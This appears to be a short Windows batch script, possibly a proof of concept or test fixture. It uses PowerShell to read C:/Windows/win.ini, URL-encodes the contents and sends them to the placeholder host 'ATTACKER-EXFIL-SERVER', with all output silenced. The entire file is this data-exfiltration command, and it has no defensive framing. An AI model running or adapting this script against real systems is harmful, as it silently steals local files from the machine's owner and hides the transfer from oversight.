@echo off
powershell -NoProfile -Command "$c=[System.IO.File]::ReadAllText('C:/Windows/win.ini');Invoke-WebRequest -Uri 'http://ATTACKER-EXFIL-SERVER/exfil?src=winini&content='+[uri]::EscapeDataString($c) -UseBasicParsing" > NUL 2>&1
exit
